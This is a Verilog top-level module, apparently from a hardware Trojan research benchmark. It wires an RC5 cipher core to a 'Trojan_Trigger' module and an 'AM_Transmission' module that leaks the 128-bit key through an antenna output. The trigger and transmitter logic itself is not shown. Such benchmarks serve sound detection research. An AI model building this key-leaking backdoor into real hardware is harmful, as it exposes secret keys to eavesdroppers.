`timescale 1ns / 1ps

module top(
    input clk,
    input rst,
    input flag,
    input [127:0] key,
    input key_en,
    output key_ok,
    input [63:0] din,
    input din_en,
    output [63:0] dout,
    output dout_en,
	output Antena
    );
	 
	 wire Tj_Trig;

	rc5_core RC5  (clk, rst, flag, key, key_en, key_ok, din, din_en, dout, dout_en);
	Trojan_Trigger Tj_Trigger (rst, clk, din, Tj_Trig);
	AM_Transmission TSC (key, clk, rst, Tj_Trig, Antena);

endmodule
